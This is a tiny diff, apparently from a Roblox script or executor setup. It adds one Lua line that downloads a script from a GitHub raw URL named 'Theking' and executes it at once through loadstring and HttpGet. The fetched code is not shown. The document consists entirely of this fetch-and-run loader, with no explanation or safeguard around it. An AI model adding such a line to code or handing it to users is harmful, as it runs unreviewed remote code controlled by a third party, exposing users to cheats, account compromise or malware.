@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("raw.githubusercontent.com/binhdz6912/Theking/refs/heads/main/theking"))() 
+    
